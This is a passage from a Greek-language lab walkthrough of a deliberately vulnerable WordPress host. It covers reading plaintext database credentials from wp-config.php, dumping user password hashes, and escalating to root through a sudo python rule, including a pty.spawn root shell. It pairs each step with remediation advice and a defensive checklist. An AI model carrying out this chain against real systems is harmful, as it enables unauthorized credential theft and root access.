Όλα ανήκουν στο `www-data`, τον λογαριασμό που τρέχει ο web server — η πρώτη ένδειξη ότι η web εφαρμογή και τα αρχεία της μοιράζονται μία ταυτότητα. Η απλή λίστα αρχείων δεν αποδεικνύει από μόνη της ότι ο τρέχων χρήστης μπορεί να διαβάσει κάθε αρχείο· ελέγξτε ρητά την πρόσβαση και μην τροποποιείτε δεδομένα εφαρμογής. Το εργαστήριο είναι αναλώσιμο· τα στοιχεία που συλλέγετε από αυτό όχι.

</details>

## 8. Προστασία των μυστικών των ρυθμίσεων

Ένα αρχείο ρυθμίσεων μπορεί να περιέχει διαπιστευτήρια σε καθαρό κείμενο:

```bash
sed -n '1,160p' /var/www/html/wordpress/wp-config.php
```

**Έξοδος:**

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
```

Αυτές οι τιμές προσδιορίζουν το όνομα της βάσης, τον λογαριασμό, τον κωδικό και τον κεντρικό υπολογιστή. Σε ευάλωτο εργαστήριο δείχνουν γιατί τα αρχεία ρυθμίσεων πρέπει να έχουν αυστηρά δικαιώματα και γιατί οι λογαριασμοί βάσης δεδομένων δεν πρέπει να επαναχρησιμοποιούνται για πρόσβαση στο λειτουργικό σύστημα.

<details>
<summary><strong>Περισσότερα</strong> — γιατί αυτό το αρχείο είναι το κλασικό θησαυρίσματο, και πώς τεκμηριώνετε με ασφάλεια</summary>

Το `sed -n '1,160p'` τυπώνει τις γραμμές 1 έως 160 του αρχείου χωρίς καμία αλλαγή — η `-n` αποσιωπά την προεπιλεγμένη εκτύπωση και η διεύθυνση εύρους επιλέγει τις γραμμές, ένας καθαρός τρόπος να διαβάσετε το ενδιαφέρον κομμάτι μιας μεγάλης ρύθμισης. Για έναν ιστότοπο WordPress, το `wp-config.php` είναι το κλασικό θησαυρίσματο γιατί κρατά όνομα βάσης, λογαριασμό, κωδικό και κεντρικό σε τέσσερις προβλέψιμες γραμμές· το ίδιο μοτίβο εμφανίζεται σε μυριάδες άλλες εφαρμογές με ονόματα όπως `config.php`, `settings.py` ή `database.yml`.

Μην εκτίθετε πραγματικά διαπιστευτήρια σε αναφορές· αποκρύπτετε και αλλάξτε τα όταν τα εντοπίσετε. Ένα εύρημα πρέπει να διαβάζεται «ο κωδικός της βάσης αποθηκεύεται σε καθαρό κείμενο σε αυτή τη διαδρομή, αναγνώσιμος από αυτούς τους λογαριασμούς» — αρκετό για να το διορθώσει ο ιδιοκτήτης, και αχρείαστο για όποιον βρει την αναφορά αργότερα.

</details>

Ασφαλέστερος τρόπος να τεκμηριώσετε το εύρημα είναι να καταγράψετε μόνο την ύπαρξη και τη θέση ενός μυστικού:

```bash
stat -c '%A %U:%G %n' /var/www/html/wordpress/wp-config.php
```

**Έξοδος:**

```text
-rw-r--r-- www-data:www-data /var/www/html/wordpress/wp-config.php
```

Η λειτουργία δείχνει ότι το αρχείο είναι αναγνώσιμο από τον ιδιοκτήτη, την ομάδα και τους υπόλοιπους. Ένα αρχείο ρυθμίσεων παραγωγής με μυστικά πρέπει γενικά να είναι αναγνώσιμο μόνο από τον λογαριασμό της υπηρεσίας και τους διαχειριστές, σύμφωνα με το σχέδιο ανάπτυξης.

<details>
<summary><strong>Περισσότερα</strong> — πώς διαβάζετε τη συμβολοσειρά δικαιωμάτων με μια ματιά</summary>

Η `stat -c` τυπώνει μόνο τα πεδία που ζητάτε: το `%A` τα συμβολικά δικαιώματα, το `%U:%G` ιδιοκτήτη και ομάδα, το `%n` το όνομα. Η συμβολοσειρά `-rw-r--r--` χωρίζεται σε τρεις τριάδες — ο ιδιοκτήτης μπορεί να διαβάσει και να γράψει, η ομάδα μόνο να διαβάσει, και οι υπόλοιποι επίσης να διαβάσουν — και το αρχικό `-` δηλώνει κανονικό αρχείο. Σε κοινόχρηστο μηχάνημα, το «οι υπόλοιποι μπορούν να διαβάσουν» περιλαμβάνει κάθε άλλο λογαριασμό, και αυτό είναι ακριβώς η έκθεση.

Η συνηθισμένη διόρθωση είναι μια εντολή που εκτελεί ο ιδιοκτήτης του αρχείου: `chmod 600 wp-config.php`, ώστε μόνο ο λογαριασμός της υπηρεσίας να μπορεί να το ανοίξει. Τα εργαλεία διαχείρισης ρυθμίσεων και οι οδηγοί ανάπτυξης πρέπει να ενσωματώνουν αυτό το δικαίωμα, γιατί ένα μυστικό με δημόσια δικαιώματα ανάγνωσης είναι ένα μυστικό με ημερομηνία λήξης.

</details>

## 9. Επιθεώρηση της βάσης δεδομένων

Με διαπιστευτήρια εξουσιοδοτημένα για το εργαστήριο, συνδεθείτε τοπικά:

```bash
mysql -u root -p
```

Μετά την εισαγωγή του κωδικού στην προτροπή, χρησιμοποιήστε ερωτήματα ανακάλυψης μόνο για ανάγνωση:

```sql
SHOW DATABASES;
USE wordpress;
SHOW TABLES;
SELECT ID, user_login, user_pass FROM wp_users;
```

**Έξοδος:**

```text
Database
information_schema
mysql
wordpress

Tables_in_wordpress
wp_options
wp_posts
wp_users

ID  user_login  user_pass
1   steven       $P$...redacted-hash...
2   michael      $P$...redacted-hash...
```

Η `SHOW DATABASES` απαριθμεί τις βάσεις που είναι ορατές στον λογαριασμό, η `USE` αλλάζει την ενεργή βάση και η `SHOW TABLES` απαριθμεί τους πίνακές της. Το ερώτημα στο `wp_users` ανακτά ονόματα λογαριασμών και κατακερματισμούς κωδικών.

<details>
<summary><strong>Περισσότερα</strong> — κατακερματισμοί, και τι είναι και τι δεν είναι</summary>

Ο κατακερματισμός δεν είναι ο αρχικός κωδικός: είναι μια μονόδρομη δακτυλική αποτύπωση που υπολογίζεται από αυτόν, οπότε η βάση δεδομένων δεν αποθηκεύει ποτέ τον ίδιο τον κωδικό — αλλά αδύναμοι κωδικοί μπορεί να ανακτηθούν μέσω ελέγχου εκτός σύνδεσης, γιατί ο υπολογισμός υποψηφίων αποτυπωμάτων και η σύγκρισή τους είναι γρήγορος. Το πρόθεμα `$P$` αναγνωρίζει τη μορφή PHPass που χρησιμοποιεί το WordPress. Η ανάκτηση τέτοιου κατακερματισμού είναι νόμιμη μόνο σε εξουσιοδοτημένο εργαστήριο· σε οποιοδήποτε άλλο σύστημα είναι μη εξουσιοδοτημένη πρόσβαση σε υλικό διαπιστευτηρίων.

Αποθηκεύστε τους κατακερματισμούς με ασφάλεια, αποφεύγετε να τους βάζετε σε δημόσια σημειώματα και χρησιμοποιείτε μόνο εγκεκριμένες λίστες λέξεων και υλικό σε εργαστήριο. Σημειώστε επίσης τι αποδεικνύει ήδη ο πίνακας χωρίς καμία «σπάσιμο» κωδικού: δύο λογαριασμοί μοιράζονται την ίδια εφαρμογή, και αν ένας από τους δύο επαναχρησιμοποιεί τον κωδικό του αλλού — όπως υπέδειξε το μήνυμα mail στην ενότητα 7 — το web προκαθήλωμα και ο λογαριασμός κελύφους είναι το ίδιο μυστικό με δύο μάσκες.

</details>

Εξάγετε μόνο αποκομμένα στοιχεία για τεκμηρίωση:

```bash
mysql -u root -p -D wordpress -e \
'SELECT ID,user_login FROM wp_users;' > wordpress-users.txt
cat wordpress-users.txt
```

**Έξοδος:**

```text
ID  user_login
1   steven
2   michael
```

Η εντολή καταγράφει αναγνωριστικά λογαριασμών χωρίς να αντιγράφει κατακερματισμούς κωδικών. Η `-e` εκτελεί ένα ερώτημα και τερματίζει, πράγμα χρήσιμο για επαναλήψιμη συλλογή στοιχείων.

<details>
<summary><strong>Περισσότερα</strong> — χτίζοντας συνήθεια τεκμηρίωσης</summary>

Η `-D wordpress` επιλέγει τη βάση από την αρχή, ώστε το ερώτημα να μη χρειάζεται `USE`, και η ανακατεύθευση του κελύφους `>` γράφει το αποτέλεσμα στο `wordpress-users.txt` αντί να το εμφανίζει μόνο — η αρχή του αρχείου στοιχείων σας. Η εκτέλεση της ίδιας εντολής μία γραμμής δύο φορές παράγει το ίδιο αρχείο — αυτό κάνει την αλυσίδα στοιχείων επαναλήψιμη μήνες μετά.

Η συνήθεια γενικεύεται: συλλέγετε τη μικρότερη πληροφορία που αποδεικνύει το σημείο, την αποθηκεύετε σε αρχείο με το όνομα του βήματος, και δεν αφήνετε ποτέ ένα ζωντανό διαπιστευτήριο να είναι αυτό που αποθηκεύετε. Ένα στιγμιότυπο οθόνης είναι πιο αδύναμο στοιχείο από την εντολή και την ανακατευθευμένη έξοδό της, γιατί δεν μπορεί να ξανατρέξει ούτε να αναζητηθεί.

</details>

## 10. Έλεγχος των ορίων προνομίων

Για κάθε εξουσιοδοτημένο λογαριασμό κελύφους, εξετάστε τις επιτρεπτές εντολές `sudo`:

```bash
sudo -l
```

**Έξοδος (περιορισμένος λογαριασμός):**

```text
User michael may not run sudo on raven.
```

**Έξοδος (λανθασμένη ρύθμιση):**

```text
User steven may run the following commands on raven:
    (root) /usr/bin/python
```

Η `sudo -l` εμφανίζει τις εντολές που ο τρέχων χρήστης μπορεί να εκτελέσει μέσω `sudo`. Η πρώτη έξοδος κλειδώνει την πόρτα· η δεύτερη σημαίνει ότι ο λογαριασμός μπορεί να εκτελέσει τον συγκεκριμένο interpreter ως root.

<details>
<summary><strong>Περισσότερα</strong> — γιατί ένας interpreter στο <code>sudoers</code> είναι αποτυχία ορίου</summary>

Διαβάστε τη δεύτερη έξοδο σαν πρόταση: «ο χρήστης `steven` μπορεί να εκτελέσει το `/usr/bin/python` ως root». Ένας γενικός σκοπού interpreter μπορεί να εκτελέσει εντολές λειτουργικού συστήματος — η Python μπορεί να εισαγάγει τη μονάδα `os` και να καλέσει οτιδήποτε — οπότε ένας κανόνας που επιτρέπει έναν interpreter επιτρέπει ουσιαστικά κάθε εντολή, και αυτό είναι σοβαρή παραβίαση ορίου προνομίων. Ο ίδιος λογικός καταδικάζει και τους επεξεργαστές κειμένου (που μπορούν να εκτελέσουν εντολές κελύφους), τα ίδια τα κέλυφη, τους διαχειριστές πακέτων και κάθε πρόγραμμα που μπορεί να δειχτεί σε δικό του σενάριο.

Σε πραγματικό σύστημα, αφαιρέστε τον ευρύ κανόνα και αντικαταστήστε τον με μια στοχευμένη διοικητική εντολή ή έναν ασφαλέστερο μηχανισμό υπηρεσίας: ένα μόνο επιτρεπτό εκτελέσιμο με σταθερά ορίσματα, ή ένα σωστό σχέδιο διαχωρισμού προνομίων. Ο κανόνας πρέπει να διαβάζεται «μπορεί να επανεκκινήσει ακριβώς αυτή την υπηρεσία», ποτέ «μπορεί να τρέξει αυτό το ελβετικό μαχαίρι». Δημόσιες συλλογές όπως τα GTFOBins καταγράφουν πώς εκατοντάδες συνηθισμένα εκτελέσιμα μετατρέπονται σε κέλυφη όταν τους δίνεται sudo — αξίζει να τα δείτε μια φορά, ώστε το μοτίβο να γίνεται αναγνώσιμο.

</details>

## 11. Επίδειξη του αντίκτυπου στο εργαστήριο

Μόνο μέσα στο σκόπιμα ευάλωτο εργαστήριο, ο επιτρεπτός interpreter μπορεί να χρησιμοποιηθεί για να αποδείξει ότι ο κανόνας διασχίζει το όριο χρήστη-προς-root:

```bash
sudo /usr/bin/python -c 'import os; print(os.geteuid()); print(os.getuid())'
```

**Έξοδος:**

```text
0
0
```

Στο Linux, το αποτελεσματικό αναγνωριστικό χρήστη `0` είναι root, οπότε η έξοδος αποδεικνύει ότι ο interpreter εκκινήθηκε με προνόμια root.

<details>
<summary><strong>Περισσότερα</strong> — γιατί η μη διαδραστική απόδειξη έρχεται πρώτη</summary>

Η `geteuid()` τυπώνει το *αποτελεσματικό* αναγνωριστικό χρήστη — αυτό που συμβουλεύεται ο πυρήνας για τους ελέγχους δικαιωμάτων — και η `getuid()` το πραγματικό· το να είναι και τα δύο `0` σημαίνει ότι η διεργασία τρέχει ως root κάθε έννοια. Η παράμετρος `-c` εκτελεί τον δοσμένο κώδικα Python και τερματίζει, οπότε δεν μένει τίποτα διαδραστικό σε εξέλιξη στον στόχο.

Αυτή η μη διαδραστική επίδειξη είναι πιο ασφαλής και πιο καθαρή από το άμεσο άνοιγμα ενός πλήρους root κελύφους, επειδή επιβεβαιώνει τον αντίκτυπο με ελάχιστη δράση: παράγει μία μικρή, άμεσα παραθέσιμη γραμμή στοιχείου, δεν αγγίζει τίποτα στο σύστημα και σας δίνει στιγμή να αποφασίσετε — και να γράψετε — τι θα κάνετε στη συνέχεια. Η ίδια εντολή μίας γραμμής είναι ο τρόπος με τον οποίο θα αποδεικνύατε τον αντίκτυπο σχεδόν για οποιοδήποτε εύρημα κλιμάκωσης προνομίων: δείξτε την ταυτότητα, όχι τον στέμμα.

</details>

Κάποια εκπαιδευτικά περιβάλλοντα παρουσιάζουν ένα διαδραστικό κέλυφος μέσω ψευδοτερματικού:

```bash
sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
```

**Έξοδος:**

```text
root@raven:/home/steven#
```

```bash
id
```

**Έξοδος:**

```text
uid=0(root) gid=0(root) groups=0(root)
```

Η `pty.spawn` συνδέει ένα κέλυφος σε ψευδοτερματικό, βελτιώνοντας τη διαδραστική συμπεριφορά, και η έξοδο της `id` επιβεβαιώνει το επίπεδο προνομίων.

<details>
<summary><strong>Περισσότερα</strong> — η αμυντική αντιμετώπιση ενός τέτοιου ευρήματος</summary>

Μια προτροπή που τελειώνει σε `#` είναι η γρήγορη οπτική ένδειξη ότι είστε διαχειριστής· η γραμμή `id` είναι η απόδειξη, γιατί μόνο το uid `0` τυπώνει `uid=0(root)`. Τα διαδραστικά κέλυφη είναι άνετα για εξερεύνηση, αλλά κάθε επιπλέον εντολή που τρέχετε ως root είναι μια επιπλέον εγγραφή στα logs — σε βαθμολογούμενη άσκηση, η μη διαδραστική απόδειξη της προηγούμενης ενότητας είναι συνήθως το καθαρότερο παραδοτέο.

Μην χρησιμοποιείτε αυτή την τεχνική σε συστήματα χωρίς εξουσιοδότηση· η κατάλληλη αμυντική αντίδραση είναι η αφαίρεση της επικίνδυνης εγγραφής `sudoers` και ο έλεγχος των logs εκτέλεσης εντολών. Το `sudo` καταγράφει κάθε κλήση, μαζί με τον κανόνα που την επέτρεψε, οπότε το ίχνος υπάρχει ήδη — η ανάγνωσή του είναι ο τρόπος με τον οποίο μια οργάνωση ανακαλύπτει ότι ένας τέτοιος κανόνας έχει καταχραστεί διαρκώς.

</details>

## 12. Εντοπισμός και τεκμηρίωση τελικών στοιχείων

Αφού έχει αποδειχθεί η πρόσβαση root στο εργαστήριο, ψάξτε μόνο στους καταλόγους της πρόκλησης ή σε ρητά εξουσιοδοτημένες διαδρομές:

```bash
find /root /home /var/www -maxdepth 3 -type f -iname '*flag*' -print 2>/dev/null
```

**Έξοδος:**

```text
/root/flag4.txt
/home/steven/flag3.txt
/var/www/html/flag2.txt
```

Η εντολή αναζητά ονόματα αρχείων που περιέχουν `flag`, περιορίζει την αναδρομή σε τρία επίπεδα και αποσιωπά σφάλματα δικαιωμάτων. Διαβάστε τα αρχεία μόνο όσο απαιτεί η άσκηση και μετά καταγράψτε τις θέσεις και τη διαδρομή πρόσβασης αντί να δημοσιεύετε περιττό μυστικό περιεχόμενο.

<details>
<summary><strong>Περισσότερα</strong> — από ένα βρεθέν αρχείο σε ένα επαγγελματικό εύρημα</summary>

Η `-iname` αντιστοιχίζει το μοτίχο αγνοώντας διάκριση πεζών/κεφαλαίων, οπότε βρίσκονται και `Flag.txt` και `FLAG3.TXT`, και η `-print` δηλώνει ρητά την προεπιλεγμένη ενέργεια — αβλαβής εδώ, αλλά στην ίδια θέση υποδέχεται το `-exec`, που μπορεί να κάνει ένα τυπογραφικό λάθος να εκτελέσει μια εντολή σε εκατοντάδες αρχεία. Η αναζήτηση μόνο σε ρητούς καταλόγους κρατά τη σάρωση και την αναφορά μέσα στη συμφωνημένη εμβέλεια.

Ένα επαγγελματικό εύρημα πρέπει να συνδέει τα στοιχεία με τη διόρθωση. Η αλυσίδα αυτού του εργαστηρίου αντιστοιχεί απευθείας σε ενέργειες:

| Στοιχείο που συλλέχθηκε | Διόρθωση |
| --- | --- |
| Σχόλιο στον πηγαίο κώδικα της σελίδας | Αφαιρέστε τα εκτεθειμένα σχόλια· διορθώστε τη διαδικασία αναθεώρησης που τα άφησε να βγουν |
| Εκδόσεις WordPress και plugins | Ενημερώνετε CMS, themes και plugins |
| Κωδικός βάσης σε καθαρό κείμενο στο `wp-config.php` | Αποθηκεύστε τα μυστικά σε προστατευμένη ρύθμιση ή secrets manager, με αυστηρά δικαιώματα αρχείων |
| Επαναχρησιμοποίηση κωδικού μεταξύ web και κελύφους | Χρησιμοποιείτε μοναδικούς, μεγάλους κωδικούς και πολυπαραγοντική αυθεντικοποίηση όπου είναι εφικτό |
| Superuser βάσης δεδομένων για πρόσβαση web | Δίνετε στους λογαριασμούς βάσης μόνο τα δικαιώματα που απαιτεί η εφαρμογή |
| Κανόνας `sudoers` που επιτρέπει Python | Αντικαταστήστε τους κανόνες interpreters με αυστηρά περιορισμένες εντολές |

</details>

## Αμυντική λίστα ελέγχου

- Χρησιμοποιείτε απομονωμένο δίκτυο και επιβεβαιώνετε εξουσιοδότηση πριν από σάρωση.
- Απενεργοποιείτε directory listings και αφαιρείτε μυστικά από HTML σχόλια.
- Ενημερώνετε web server, PHP, CMS, themes και plugins.
- Προστατεύετε configuration files και χρησιμοποιείτε secrets manager όπου είναι κατάλληλο.
- Χρησιμοποιείτε μοναδικούς κωδικούς και MFA όπου είναι δυνατό.
- Δίνετε στις βάσεις δεδομένων μόνο τα απαιτούμενα δικαιώματα.
- Ελέγχετε sudoers entries για interpreters, editors και shells.
- Καταγράφετε authentication, database, web και privilege events.
- Περιστρέφετε άμεσα credentials που μπορεί να εκτέθηκαν.

## Βασικά συμπεράσματα

Μια ισχυρή αξιολόγηση είναι αλυσίδα επαληθευμένων παρατηρήσεων: μια θύρα αποκαλύπτει υπηρεσία, η απαρίθμηση αποκαλύπτει διαδρομές εφαρμογής, η εξέταση κώδικα και ρυθμίσεων αποκαλύπτει αδυναμίες, η επιθεώρηση της βάσης δεδομένων εξηγεί τις σχέσεις λογαριασμών και η `sudo -l` αποκαλύπτει το τελικό όριο προνομίων.

Σε κάθε βήμα αποθηκεύετε την έξοδο της εντολής, εξηγείτε τι αποδεικνύει και ξεχωρίζετε τα επιβεβαιωμένα γεγονότα από τις υποθέσεις. Η ίδια ροή εργασίας υποστηρίζει τόσο την ασφαλή εκπαίδευση σε sandbox όσο και τη διορθωτική αμύνα σε παραγωγή.
